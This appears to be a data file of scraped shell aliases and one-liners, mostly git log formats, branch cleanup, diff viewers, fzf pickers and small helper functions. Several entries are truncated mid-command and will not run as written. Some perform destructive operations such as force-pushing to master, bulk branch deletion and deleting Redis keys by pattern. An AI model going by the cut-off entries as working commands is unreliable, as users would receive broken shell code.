"git log --since=""2016-1-1"" |git shortlog -s -n"
"git log --since=""2015-1-1"" |git shortlog -s -n"
"git log --since=""2014-1-1"" |git shortlog -s -n"
"git log --since=""08:30:00"" --format=""%s%n%b"" --author=""$(git config --global user.name)"" | grep ""^[^(Change-id)]"""
"git log --shortstat --author=""Kurt Hsu"" | \
"git log --reverse --since=""6am"" --pretty=oneline --abbrev-commit | cut -c 9-"
"git log --reverse --date=short --pretty=format:""(%ad) [%an] %s"" | head -1"
"git log --pretty=tformat:""%h %ad | %s%d [%an]"" --graph --date=short"
"git log --pretty=oneline --pretty=""%h %cn %cr ---- %s"" | head -5"
"git log --pretty=format:\""%h %ad | %s%d [%an]\"" --graph --date=short"
"git log --pretty=format:\""%ad | %s%d [%an]\"" --graph --date=relative"
"git log --pretty=format:\""%Cgreen%h%Creset %ad | %s%d [%Cred%an%Creset]\"" --graph --date=relative"
"git log --pretty=format:'%an, %aD: %s%n' --reverse | grep -v Merge"
"git log --pretty=format:'%C(cyan)%h%Creset %C(yellow)%ad %C(white)%<|(80,trunc)%s %Creset%Cgreen(%ar) %C(y ellow dim)<%an>%Creset' --abbrev-commit --date=short"
"git log --pretty=format:""%h | %s%d [%an]"" --graph --date=short"
"git log --pretty=format:""%h | %cd [%cn]%n%s%d%n"" --date=iso --name-status"
"git log --pretty=format:""%h : %an : %s"" | ${AWKCMD} ${AWKACTFILE}"
"git log --pretty=format:""%h : %an : %s"" | ${AWKCMD} ${AWKACTFILE} -v ACT=\!:1"
"git log --pretty=format:""%h : %an : %s"" --author=""`git config user.name`""| ${AWKCMD} ${AWKACTFILE}"
"git log --pretty=format:""%h %cD | %s%d [%an]"" --graph --date=short"
"git log --pretty=format:""%h %cD | %s%d [%an]"" --graph --date=short --all"
"git log --pretty=format:""%h %ai | %s%d [%an]"" --graph --date=short "
"git log --pretty=format:""%h %ad | %s%d"" --graph --date=short"
"git log --pretty=format:""%h %ad | %s%d"" --graph --date=short "
"git log --pretty=format:""%h %ad | %s%d"" --graph --date=iso --since=""7 days ago"" --author=""Yu-Chun Huang"" --all"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --max-count=8"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short master --all"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short -n 10"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short --tags --color"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short --since=""1am"""
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short --max-count=40 $*"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short --decorate"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short --color"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short --abbrev-commit"
"git log --pretty=format:""%h %ad | %s%d [%an]"" --graph --color --date=short"
"git log --pretty=format:""%h %ad | %s [%an]"" --graph --date=relative"
"git log --pretty=format:""%h %ad | %s [%an]"" --graph --date=iso"
"git log --pretty=format:""%h %ad | %s [%an]"" --date=short"
"git log --pretty=format:""%h %ad | %C(bold white)%s%C(reset)%C(green)%d%C(reset) [%an]"" --graph --date=short"
"git log --pretty=format:""%h %ad %cd | %s%d [%an]"" --graph --date=short --all"
"git log --pretty=format:""%h %C(magenta)%ad | %C(white)%s%d %C(magenta)[%an]"" --date=short --graph --max-count=40 $*"
"git log --pretty=format:""%an <%ae>"" | perl -e "
"git log --pretty=format:""%an - %s"" | ack"
"git log --pretty=format:""%ad"" --date=short | uniq -c"
"git log --pretty=format:""%H - %ae, %ar : %s"" |grep "
"git log --pretty=format:""%Cred%h%Creset %ad | %s%d [%an]"" --graph --date=short"
"git log --pretty=format:""%Cred%h%Creset %C(white)%ad%Creset | %s %C(cyan)[%an]%Creset"" --date=local"
"git log --pretty=format:""%C(yellow)%h %Creset%s - %C(white)%an %C(white bold)%ar"" --graph | head"
"git log --pretty=format:""%C(auto)%h%d %<(60,trunc)%s %C(white)%an %cr%C(reset)"" -n 20 --graph --all --color=always | tr -s "" """
"git log --pretty=format:""%C(auto)%h %ad | %s%d %C(red)[%an]"" --graph --date=short"
"git log --pretty=format:""%C(auto)%h %ad | %C(auto)%s%d"" --date=format:""%y-%m-%d %R"""
"git log --pretty=format:"" %h %s %d"" | head -n40"
"git log --pretty=format:"" %h %s %d"" | head -n 25"
"git log --pretty=email G ""^From:"" | perl -e "
"git log --pretty='%h, %s, %ar, %cn' | column -s ',' -t"
"git log --pretty='%h, %s, %ar, %cn' --graph | column -s ',' -t"
"git log --pretty=""format:* %s"" --merges --grep ""pull request"" | sed -e ""s/Merge pull request #[0-9]\{1,\} from kabisaict\///"" -e ""s/_/ /g"""
"git log --pretty=""format:%t | %ai %d --- %cn"""
"git log --oneline --reverse --since=""5am"" --author=""Anton"" | sed ""s/^/* /"""
"git log --oneline --graph --branches --all --color --decorate --date=format:""%y-%m-%d %H:%M"" --pretty=format:""%C(auto)%h%Creset%C(auto)%d%Creset %s %C(#505050)(%cd, %an)%Creset"" | $HOME/.dotfiles/scripts/reverse_log.py"
"git log --oneline --format=\""%h %<(50,trunc)%s\"" | less"
"git log --oneline --format=""%Cgreen%h%Creset:%cr:%an:%s""|column -t -s:"
"git log --no-merges --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %ar] %C(cyan)%ae%C(white)%d %C(reset) %n%n%w(76,4,4)%B'"
"git log --graph --pretty=tformat:""%C(red)%h%C(auto)%d %C(yellow)%ar %C(green)%an"" --date=short --all | head --lines=20"
"git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit | less --tabs=1,5 -RFX"
"git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit -1 | less --tabs=1,5 -RFX"
"git log --graph --pretty=format:""%h - %d %s (%cr) <%an>"" | vim -R \
"git log --graph --pretty=format:""%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset"" --abbrev-commit --color=always | less -r"
"git log --graph --pretty=format:""%Cred%H%Creset -%C(auto)%d%Creset %s %Cgreen(%ad) %C(bold blue)<%an>%Creset"" --abbrev-commit |head -20"
"git log --graph --pretty=format"":%C(yellow)%h%Cblue%d%Creset %s %C(white) %an,%ar%Creset"" --abbrev-commit --decorate | head"
"git log --graph --oneline --pretty=format:'''%Cred%h%Creset -%C(yellow)%d%Creset %<|(`echo $((get_terminal_width-25))`,trunc)%s %Cgreen(%cd) %C(bold blue)<%aN>%Creset''' --abbrev-commit --abbrev=4 --date=short"
"git log --graph --oneline --no-abbrev-commit | grep ""Merge branch "
"git log --graph --oneline --decorate --all $( git fsck --no-reflog | awk ""/dangling commit/ {print $3}"" )"
"git log --graph --format=format:'%<|(80,trunc)%s %<(14,trunc)%C(yellow)%ar %<(16,trunc)%C(cyan)%an %C(white)%h%C(bold green)%d'"
"git log --graph --format=format:""%h %d %s [%cn]"" --all --color --full-history --sparse | lss -R"
"git log --graph --all --pretty=format:""%Cgreen%h %Cblue@ %aI %C(yellow) by [%an] %Cred%d %Creset| %s"" --decorate=auto"
"git log --graph --all --date=relative --pretty=format:'%Cred%h %Creset%<|(50,trunc)%s %C(bold blue)<%an>%Creset %Cgreen(%cd)%Creset%C(auto)%d'"
"git log --format=format:%H $1 | xargs -L 1 git blame $1 -L $2,$2"
"git log --format=""%s"" --since=""12 hours ago"" | perl -pe ""s/\n/$1, /"""
"git log --format=""%n%Cblue--- %Cred%h %Cgreen(%ci) %Cred%an %Cblue---%n %s | %b"" --name-status"
"git log --format=""%h"" -n 1 | cat"
"git log --format=""%H"" -n 1 | pbcopy"
"git log --decorate=short --format=""%Cgreen%h%Cred%d %Creset%s %Cblue[%an | %ad]"" --graph --date=short --all"
"git log --decorate=auto --graph --source --date=short --pretty=format:""%C(yellow)%<|(12)%h %Cblue%>(12,trunc)%ad %Cgreen%<(17,trunc)%aN%Cred%d %Creset%s"""
"git log --decorate | grep ""commit.*(.*)"""
"git log --decorate --abbrev-commit --date=short --pretty=format:""%C(red bold)%h%Creset %C(dim green)%ad%Creset %C(cyan bold)|%Creset %s"""
"git log --decorate --abbrev-commit --date=short --pretty=format:""%C(red bold)%h%Creset %C(cyan bold)|%Creset %C(auto)%d%Creset%s"""
"git log --date=short --pretty=format:'%C(bold blue)%h%C(reset) %<|(35)%ar %<(70,mtrunc) %s %d'"
"git log --date=short --pretty=format:'%C(auto) %<(18,trunc) %an %<|(35) %ar %<(70,mtrunc) %s %d' -n 20"
"git log --date-order --date=iso --pretty=""format:%ad"" --reverse | head -1"
"git log --color --graph --pretty=format:""%C(bold white)%h%Creset - %C(bold green)%d%Creset%s%C(bold green)(%cr)%Creset%C(bold blue)<%an>%Creset"" --abbrev-commit --date=relative | cat"
"git log --color --graph --pretty=format:""%C(auto)%h %ad | %C(white)%s%Creset%C(auto)%d%Creset %C(dim cyan)<%an>%Creset"" --date=short"
"git log --color --all --date-order --decorate --dirstat=lines,cumulative --stat|less -R"
"git log --branches --remotes --tags --oneline --pretty=format:\""%h\ %ad\ \|\ %s%d\ [\%an]\"" --graph --date=short --max-count=40"
"git log --author=o.gorban --pretty=format:""%Cred%h%Creset - %C(cyan)%cd%Creset %Cgreen%s"" --date=short | less -S"
"git log --author=""stagl"" --all --since=""yesterday"" --pretty=tformat: --numstat | gawk "
"git log --author=""haas"" --branches --no-merges --since=""8 days ago"" --pretty=format:""%cd %s"" | tac"
"git log --author=""ghapereira"" --pretty=tformat: --numstat | awk "
"git log --author=""Volkmann"" --branches --no-merges --since=""8 days ago"" --pretty=format:""%cd %s"" | tac"
"git log --author=""Maxim Derbin"" --pretty=tformat: --numstat | awk "
"git log --author=""Andy McKay"" -n 100 | grep $1 -B 4"
"git log --all --since=yesterday.6am --until=6am --format=""* %s"" --author=""Mihael Safaric"" --reverse -- | pbcopy"
"git log --all --since=yesterday.6am --until=6am --format=""* %s"" --author=""$(git config --global user.name)"" --reverse -- | pbcopy"
"git log --all --since=6am --format=""* %s"" --author=""Mihael Safaric"" --reverse -- | pbcopy"
"git log --all --since=6am --format=""* %s"" --author=""$(git config --global user.name)"" --reverse -- | pbcopy"
"git log --all --since=""6am"" --until=""today"" --format=""[%h] %s %an"" | grep $@ -i"
"git log --all --reverse --full-history --since=""8 hours ago"" --author=""`git config user.name`"" --pretty=format:""%s"" | sed -e ""s/ (#.*$//;s/\.$//;\$a\\"""
"git log --all --pretty=format:""%h %ci | %d %s"" --max-count=10 --date=short"
"git log --all --format=""%h %ai %s"" --since=$(date +""%Y-%m-%d-00:00:00"") --author=$(git config user.email)|xsel --clipboard --input --logfile /dev/null"
"git log --all --decorate=short --graph --color --date=short --pretty=format:""%Cblue%h%Creset %C(yellow)%cd%Creset %C(bold blue)<%an>, %Cgreen(%ar)%Creset | %s"""
"git log $(git tag | tail -1)..HEAD --no-merges --pretty=""[%h] %s"""
"git log ""$NGT_GIT_LOG_FORMAT"" | head"
"git lg | head; printf ""\r"""
"git lg -500 | egrep "" [Cc]arole[-_ ][Ll]avillonniere\)"""
"git lc | grep -vi ""merge"""
"git lastbranches| grep ""Stunden"""
"git l $( git fsck --no-reflog | awk ""/dangling commit/ {print \$3}"" )"
"git grep -n --color -l ""^ *debugger""| grep -v vendor"
"git grep -I --ignore-case -E ""todo.*(smithers|JJS)"""
"git grep -EiI ""FIXME|TODO"""
"git grep -EIn ""TODO|FIXME"""
"git grep -EI ""TODO|FIXME"""
"git for-each-ref refs/tags/ --format ""%(objecttype) %(refname:short)"" | while read ty name; do [ $ty = commit ] && echo $name; done"
"git for-each-ref refs/heads --sort=-committerdate --format=""%(color:green) %(align:15) %(committerdate:relative) %(end) %(color:reset) %(align:60)%(refname:short)%(color:red) %(upstream:track)%(end)%(color:blue)%(upstream:short)"" | head -n 5"
"git for-each-ref --sort=committerdate refs/heads/ refs/remotes/ --format=""%(committerdate:short) %(objectname:short) %(refname:short)"" | sort -r"
"git for-each-ref --sort=committerdate --format=""%(refname:short)%09%(subject)"" refs/heads/ | git_columnize"
"git for-each-ref --sort=committerdate --format=""%(refname:short) err.txt generated.file succ.txt %(authorname) err.txt generated.file succ.txt %(committerdate:relative)"" refs/remotes/ | column -t -s ""*"""
"git for-each-ref --sort=-committerdate --format=""%(refname:short)"" refs/heads/ | head -1"
"git for-each-ref --sort=-committerdate --format=""%(refname:short)"" refs/heads/ --no-merged develop --count 5 | grep -v ""master"""
"git for-each-ref --sort=-committerdate --format=""%(color:green)%(committerdate:relative)%(color:reset) %(color:yellow)%(refname:short)%(color:reset) %(color:bold blue)<%(authorname)>%(color:reset)"" refs/heads/ | head -n20"
"git for-each-ref --sort=-committerdate --format=""%(authordate:short) %(refname:short)"" refs/heads/ | xargs -I{} printf ""%s\n"" {}"
"git for-each-ref --sort=""-committerdate"" --format=""%(authordate:short)%09%(refname:short)"" refs/heads | head"
"git for-each-ref --sort=""-authordate:iso8601"" --format="" %(color:green)%(authordate:iso8601)%09%(color:white)%(refname:short)"" refs/heads | head -n 20"
"git for-each-ref --sort=""-*authordate"" --format=""%(tag) - %(taggerdate:short)%0a%(contents)"" refs/tags | less"
"git for-each-ref --shell --format=""echo %(refname:short) && git log -n 1 --format=format:\"" %%cd%%n %%B\"" %(refname)"" refs/ | sh"
"git for-each-ref --format=""^%(refname:short)"" -- refs/notes/ | xargs gitk --all"
"git for-each-ref --format=""%(refname:short)"" | while read b; do if r=$(git config --get branch.$b.remote); then m=$(git config --get branch.$b.merge); echo ""$b -> $r/${m##*/}""; fi; done"
"git for-each-ref --format=""%(refname:short) %(taggerdate) %(subject) %(body)"" refs/tags | sort -V"
"git for-each-ref --format=""%(refname)"" | xargs git grep -n"
"git for-each-ref --format=""%(committerdate) %09 %(authorname) %09 %(refname)"" | sort -k5n -k2M -k3n -k4n"
"git for-each-ref --count=30 --sort=-committerdate refs/heads/ --format=""%(refname:short)"" | vim -R -"
"git for-each-ref --count=30 --sort=-committerdate refs/heads/ --format=""%(refname:short)"" | more"
"git for-each-ref --count=20 --format='%(authorname),%(color:yellow)%(refname:short)%(color:reset),%(color:green)%(committerdate:relative)%(color:reset)' --sort=-committerdate refs/heads/ | column -t -s ','"
"git flow feature finish `git rev-parse --abbrev-ref HEAD | sed ""s/feature\///""`"
"git flow feature finish `git branch | sed -En ""s/\* feature\/(.*)/\1/p""`; ggp"
"git files | while read f; do echo ""------ NEEDS REVIEW ------"" >> ${f}; done;"
"git fetch --all; git pull origin $(git status |perl -nle ""/^On branch (\\S+)/ && print \$1"" )"
"git fetch $(git rev-parse --symbolic-full-name --abbrev-ref @{upstream} | sed ""s!/! !"")"
"git dlog | grep -v ""Merge pull request #"""
"git difftool -y -x ""sdiff -w $COLUMNS"" | less"
"git difftool -y -x ""colordiff -y -W $COLUMNS"" | less -R"
"git difftool --no-prompt --extcmd=""colordiff --side-by-side --width $COLUMNS"" | ${PAGER:-less}"
"git difftool --extcmd=""icdiff --line-numbers --unified=3"" --no-prompt | less"
"git diff | sed -e 's/^diff --git [^[:space:]]*/Index:/' -e 's/^index.*/\
"git diff | grep ""change back"" -A5 -B5"
"git diff | grep ""<<<<<"""
"git diff `g_curbr` develop | ack ""^\-{3}"""
"git diff HEAD --name-only | grep ""$(basename ""$PWD"")/"""
"git diff -w \""$@\"" | vim -R -"
"git diff -w ""$@"" | vimdiff -R -"
"git diff -w ""$@"" | vim"
"git diff -w ""$@"" | vim -R -"
"git diff -w ""$@"" | vim -"
"git diff -w ""$@"" | nvim -R -"
"git diff -U0 -w --no-color ""$@"" | git apply --cached --ignore-whitespace --unidiff-zero -"
"git diff --word-diff=color --word-diff-regex=""[^[:space:],()=]+|[(),=]+"""
"git diff --no-ext-diff -w ""$@"" | vim -R -"
"git diff --name-only | if xargs grep -q -nr -e ""focus: true""; then; git commit; else echo ""rejected commit"" fi; fi"
"git diff --name-only --relative=src/services/invoice origin/master | grep \
"git diff --ignore-space-at-eol -b -w --ignore-blank-lines --compact-summary --ignore-all-space | grep -v "" 0"""
"git diff --ignore-all-space --word-diff=color --word-diff-regex=""[^[:space:],()=]+|[(),=]+"""
"git diff --ignore-all-space --staged --word-diff=color --word-diff-regex=""[^[:space:],=]+|[,=]+"""
"git diff --find-copies-harder -B -C --color-words --word-diff-regex=""\\w+|[^[:space:]]"""
"git diff --find-copies-harder -B -C --color-words --cached --word-diff-regex=""\\w+|[^[:space:]]"""
"git diff --color-words=""\\w+|."""
"git diff --color-words=""\\w+|."" --cached"
"git diff --color | sed -E ""s/^([^-+ ]*)[-+ ]/\\1/"""
"git diff --cached ""$1"" | vi -"
"git diff $(git log --pretty=format:%h -2 --reverse | tr ""\n"" "" "")"
"git diff ""@{yesterday}"" | atom"
"git diff ""$@"" | vim -R -"
"git diff ""$1"" | vi -"
"git config --list|grep -e ""^remote.*\.url"""
"git config --list |
"git commit -m ""fix $(gn | sed "
"git commit -m ""$(curl https://raw.githubusercontent.com/ngerakines/commitment/master/commit_messages.txt | shuf -n 1)"""
"git commit -m ""$(curl -qs whatthecommit.com | sed -nE "
"git commit -at <(echo $(git rev-parse --abbrev-ref HEAD | cut -d_ -f 1)"": "")"
"git commit --interactive; while git status|grep ""modified:"">/dev/null; do git commit --interactive;done && git push"
"git cherry -v master develop | grep ""+ """
"git checkout develop && git pull --rebase && git fetch --prune && echo ""Merged branches:"" && git branch --merged=origin/develop|grep ""\b/\b"""
"git checkout -q master && git remote prune origin && git for-each-ref refs/heads/ ""--format=%(refname:short)"" | while read branch; do mergeBase=$(git merge-base master $branch) && [[ $(git cherry master $(git commit-tree $(git rev-parse $branch^{tree}) -p $mergeBase -m _)) == ""-""* ]] && git branch -D $branch; done; git prune"
"git checkout -q master && git for-each-ref refs/heads/ ""--format=%(refname:short)"" | while read branch; do mergeBase=$(git merge-base master $branch) && [[ $(git cherry master $(git commit-tree $(git rev-parse $branch^{tree}) -p $mergeBase -m _)) == ""-""* ]] && git branch -D $branch; git remote prune origin; git fetch -p; done"
"git checkout -q master && git for-each-ref refs/heads/ ""--format=%(refname:short)"" | while read branch; do mergeBase=$(git merge-base master $branch) && [[ $(git cherry master $(git commit-tree $(git rev-parse $branch^{tree}) -p $mergeBase -m _)) == ""-""* ]] && git branch -D $branch; done"
"git checkout -q develop && git for-each-ref refs/heads/ ""--format=%(refname:short)"" | while read branch; do mergeBase=$(git merge-base develop $branch) && [[ $(git cherry develop $(git commit-tree $(git rev-parse $branch^{tree}) -p $mergeBase -m _)) == ""-""* ]] && git branch -D $branch; done"
"git checkout $(git stash list | grep -P -o ""(?<=WIP on )(.*)(?=:)"" -m 1)"
"git checkout $(git log --branches -1 --pretty=format:""%D"" | sed ""s/.*, //g"")"
"git checkout $(git for-each-ref --sort=-committerdate --count=50 --format=""%(refname:short)"" refs/heads/ | selecta)"
"git checkout $(git branch | grep -v ""master"" ) && git branch -av "
"git checkout ""$(git branch-history 9 | tail -1)"""
"git checkout ""$(git branch-history 8 | tail -1)"""
"git checkout ""$(git branch-history 7 | tail -1)"""
"git checkout ""$(git branch-history 6 | tail -1)"""
"git checkout ""$(git branch-history 5 | tail -1)"""
"git checkout ""$(git branch-history 4 | tail -1)"""
"git checkout ""$(git branch-history 3 | tail -1)"""
"git checkout ""$(git branch-history 2 | tail -1)"""
"git checkout ""$(git branch-history 1 | tail -1)"""
"git branch;git branch --list -a|grep ""remotes/origin"" --colour=never"
"git branch | sed -e ""s/$GIT_BRANCH_PREFIX\///"""
"git branch | grep \""* \"""
"git branch | grep -v -e ""master"" -e ""develop"" > /tmp/branches-to-be-removed && vim /tmp/branches-to-be-removed && xargs git branch -D < /tmp/branches-to-be-removed && rm -rf tmp/branches-to-be-removed"
"git branch | grep -v ""master"""
"git branch | grep ""^[*]"""
"git branch | grep ""*"""
"git branch | egrep ""^\* """
"git branch 2>/dev/null | sed -n ""/^\*/s/^\* //p"""
"git branch -vv | grep "": gone"""
"git branch -d $(git branch --merged develop | grep -v -e ""*"" -e ""develop"")"
"git branch -a | grep "">"""
"git branch -a | fgrep ""*"""
"git branch -D tmp; oldbranch=`parse_git_branch | sed """
"git branch -D `git branch | grep -E ""arcpatch.*""`"
"git branch -D $(printf ""%s\n"" $(git branch) | grep ""ts/"")"
"git branch -D $(git branch | peco --prompt ""DELETE BRANCH >"")"
"git branch --verbose | \
"git branch --no-color 2> /dev/null | sed -e ""/^[^*]/d"" -e ""s/* \(.*\)/\1/"""
"git branch --merged | grep -v ""\*"""
"git branch --merged | \
"git branch --merged -r | grep -v ""\*"""
"git br && git br -a | grep --color=none ""remotes/public"""
"git blame --date=format: $1 | awk '{sub(/\(.*\s+/,\"
"git archive --remote=git@bitbucket.org:felipeelia/base-env.git HEAD | tar x && echo ""Don"
"git annex find | xargs -I ""{}"" -- find -L ~/torrents/downloads -samefile {}"
"git add . ; git commit -m ""$(fortune bofh-excuses | sed "
"git add -A; git ls-files --deleted -z | xargs -r0 git rm; git commit -m ""--wip--"""
"git add -A; git ls-files --deleted -z | xargs -r0 git rm; git commit -m ""--wip-- [skip ci]"" --no-verify"
"git add -A; git ls-files --deleted -z | xargs -0 git rm; git commit -n -m ""--wip--"""
"git add -A; git ls-files --deleted -z | xargs -0 git rm; git commit -m ""wip"""
"git add -A; git ls-files --deleted -z | xargs -0 git rm; git commit -m ""--wip--"""
"git add -A; git commit -m ""WIP: $(w3m whatthecommit.com | head -n 1)"""
"git add -A && git commit -m ""$(fortune -o | cowsay -W80)"" && git push --force"
"git add --all && git commit -m ""$(w3m whatthecommit.com | head -n 1)"" && git push origin master"
"git add $(ls -a | grep -v "".."" )"
"git add $(git -c color.status=always status --short | \
"git -c color.status=always status -s | awk ""{print NR\""\t\""\$0}"""
"git -c ""core.pager=diff-highlight | less --tabs=4 -RFX"""
"git --no-pager show --color=never | tee >(copy) && echo -e ""\nCopied!"""
"git --no-pager log master... --no-merges --date=short --pretty=format:'%C(red)%h%C(reset) - %C(green)%<|(22,mtrunc)%ar%C(reset) - %C(white)%<(80,mtrunc)%s%C(reset) %C(yellow)%<(30,trunc)%d%C(reset)'"
"git --no-pager log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short -20"
"git --no-pager log --date=short --pretty=format:'%C(red)%h%C(reset) - %C(green)%<|(19,trunc)%ar%C(reset) - %C(white)%<(80,mtrunc)%s%C(reset) %C(yellow)%<(45,trunc)%d%C(reset)' -n 20"
"git --no-pager diff --color=never | tee >(copy) && echo -e ""\nCopied!"""
"git $(git diff --name-only master..HEAD . | sed -e ""s/^/ --ignore=/"")"
"gist `git status --porcelain --untracked-files=no | cut -d "" "" -f 3`"
"gio open ""$(ls | pmenu)"""
"ghq look `ghq list |fzf --preview ""bat --color=always --style=header,grid --line-range :80 $(ghq root)/{}/README.*""`"
"ghi show $(git symbolic-ref --short HEAD | sed -e ""s/[^0-9]//g"")"
"ghcid -c ""stack ghci --main-is grid:lib grid:grid-test grid:grid-bench"" --height=$(tput lines) --width=$(tput cols) | source-highlight -s haskell -f esc"
"ghcid -c ""cabal repl lib:bobby"" --height=$(tput lines) --width=$(tput cols) | source-highlight -s haskell -f esc"
"ghc-pkg --simple-output list | ruby -pe 'gsub(/ /, \"
"gh --decorate `git reflog | cut -d "" "" -f 1`"
"gfls | ctags -L - -f ""$(git rev-parse --git-dir)/tags"""
"gfind . -type f -name ""*.mp4"" -print0 | gxargs -r -0 -n2 -i ffmpeg -i {} -vcodec copy -acodec copy ""../{}"""
"gfind . -regex "".*\.[cChH]\(pp\)?"" -print | etags -"
"get_iplayer --nopurge --nocopyright --type=livetv --pid ""tv:$1"" --stream | mplayer -cache 512 -"
"get-date | xargs printf ""%x\n"""
"gem list | grep "","""
"gem list | cut -d"" "" -f1"
"gem list | ack "","""
"gem list --local --no-details | grep -v ""default:"""
"gem install lolcommits ; lolcommits --enable ; echo ""false"" | lolcommits --config --plugin loltext"
"gdf | rg ""test/.*_test"""
"gdb $(rbenv which ruby) $(pgrep -f ""jobs:work"" | head -n1)"
"gco -b ""$1"" | gpsh -u origin ""$1"""
"gcloud compute instances list --project melo-prd | awk ""NR>1 {print \$1,\$2}"" > ~/.ssh/gce_hosts_prd"
"gcloud compute instances list --project melo-dev | awk ""NR>1 {print \$1,\$2}"" > ~/.ssh/gce_hosts_dev"
"gcloud builds log --stream $(gcloud builds list --uri --limit 1 --filter=""sourceProvenance.resolvedRepoSource.commitSha=$(git rev-parse HEAD | tr -d "
"gcal --starting-day=1 --with-week-number -q DE_BY --force-highlighting .+ | sed -n '6,\$p'"
"gbad | grep -o ""[^ ]*$"""
"gb | grep -v ""a/"" "
"gawk -vFPAT='[^,]*|\"
"gawk -v FPAT='([^,]+)|(\"
"g s -s | grep ""UU"""
"g s -s | grep ""U"""
"g s -s | grep ""M"""
"g s -s | grep ""D"""
"g s -s | grep ""A"""
"g diff --stat && g status --short | grep ""??"""
"g $(git diff --name-only master..HEAD . | sed -e ""s/^/ --ignore=/"")"
"g !git ls-files -v | grep ""^[[:lower:]]"""
"fzf_vim $(find /home/ben/dotfiles -path ""*/.*"" -prune -o -print | fzf)"
"fzf-gss | while read line; do git add ""$line"" ; done"
"fzf -m --preview=""cat {}"" | c"
"fzf -m --ansi --preview ""bat --color=always {} | head -n 100"""
"fzf --preview=""head -$LINES {}"" | xargs -r nvim"
"fzf --preview=""cat {}"" --preview-window=right:50%:wrap | tee >(copy)"
"fzf --preview-window down:3 --preview ""head -n 3 {}"" --bind ""ctrl-y:execute-silent(echo $PWD/{} | xsel -b)+abort,alt-y:execute(cat {})+abort"""
"fzf --preview ""head -60 {} | pygmentize"""
"fzf --preview ""cat {} | head -500"" --bind ""ctrl-e:execute(vim {})"""
"fzf --preview ""bat --style=numbers --color=always {}"" --bind ""enter:execute(vi {})+abort,ctrl-y:execute-silent(echo {} | pbcopy)+abort"""
"fzf --multi --read0 --print0 | xargs --delimiter=""\0"" --no-run-if-empty"
"fzf --multi --no-sort --ansi --preview=""pacaur -Si {2}"" | awk ""{print \$2}"""
"fzf --color info:4,prompt:3,spinner:3,pointer:2,marker:1 | xargs -r $EDITOR"
"fzf --bind 'f1:execute(less -f {}),ctrl-y:execute-silent(echo {} | pbcopy)+abort'"
"fzf --bind 'crtl-v:execute(vim {}),ctrl-y:execute-silent(echo {} | pbcopy)+abort'"
"fzf --bind ""f1:execute(kate {}),ctrl-y:execute-silent(echo {} | pbcopy)+abort,ctrl-n:execute(cd {})"""
"fzf --ansi --preview=""/usr/local/Cellar/ranger/1.9.2/libexec/ranger/data/scope.sh {} 40 10 ~/temp true |less"" --preview-window=right:60%"
"function() { sF ""$@"" | less }"
"function { imup ""$1"" | xclipc }"
"function packageVersion(){ cat package.json | grep ""version""; };packageVersion"
"function lsf() {python3 -c ""import os,sys; print(os.path.realpath(sys.argv[1] if len(sys.argv)==2 else \"".\""),end=\""\"")"" $1};function _cpwd(){echo `lsf $1` | pbcopy && echo `pbpaste`}; _cpwd"
"function getTags() { curl ""https://registry.hub.docker.com/v2/repositories/library/$1/tags/"" | jq """".\""results\""[][\""name\""]""""; }; getTags"
"function func { echo ""if ($*) 1 else 0"" | bc; }; func"
"function bowerParamSearch(){ cat bower.json | grep ""$1""; };bowerParamSearch"
"function _watch_subp() { watch ""ps aufx|grep -i -A 10 $1""; };_watch_subp"
"function _sublimits(){ json $1 | jq "".Options.Option[].Insurers.Insurer[].SubLimitsOfLiabilitySections""; };_sublimits"
"function _sed_rec(){ find $1 -type f -print0 | xargs -0 sed -i ""s/$2/$3/g"" ;}; _sed_rec"
"function _riskversion(){ json $1 | jq "".PlacementInformation.RiskVersion""; };_riskversion"
"function _rfind(){ find $2 -name ""*.*""|xargs grep $1;};_rfind"
"function _replace(){ ag -0 -l $1 | xargs -0 sed -i """" -e ""s/$1/$2/g""; };_replace"
"function _reddel() { redis-cli KEYS ""$1""* | xargs redis-cli DEL };_reddel"
"function _re(){ _rax=`alias $1 | sed ""s/alias $1=//""`; echo $_rax ; eval $@; }; _re"
"function _ra(){ if alias $1; then _rax=`alias $1 | sed ""s/^alias $1=.\(.*\).$/\1/""`; echo "" ===> $_rax ${@:2}""; fi; $@; }; _ra"
"function _push_ssh_key(){ cat ~/.ssh/id_rsa.pub | ssh $@ ""mkdir ~/.ssh; cat >> ~/.ssh/authorized_keys""; }; _push_ssh_key"
"function _optimize(){ pdf2ps ""$1"" - | ps2pdf -dPDFSETTINGS=/ebook - ""ompitized_$1"" && echo ""Optimized file is saved to optimized_$1""; };_optimize"
"function _mysql_cdb(){ echo ""CREATE SCHEMA $1 DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;"" | mysql -u root -p; };_mysql_cdb"
"function _memo(){smem -t -k -c pss -P ""$1"" | tail -n 1}; _memo"
"function _listening(){ lsof -n -i4TCP:""$@"" | grep LISTEN; }; _listening"
"function _latest(){ curl -s ""https://rubygems.org/api/v1/versions/$1/latest.json"" | cut -d""\"""" -f 4 };_latest"
"function _hsc(){ history | grep -1 ""$1 $2 $3 $4 $5""; };_hsc"
"function _gsh_cr(){ git show $(git cherry $1 $2 | sed ""s/+ //"") }; _gsh_cr"
"function _graby(){ grep -R -I --exclude-dir=""node*"" --exclude-dir=""db"" --exclude=""react_bundle*"" --exclude=""*.css"" --include=""*.rb"" ""$@"" . | grep -v _spec;}; _graby"
"function _ggfa(){ git grep -l ""$1"" | xargs sed -i """" -e ""s/""$1""/""$2""/g""; };_ggfa"
"function _fh(){ fh=""$@""; history | fzf -m -q ""$fh"" };_fh"
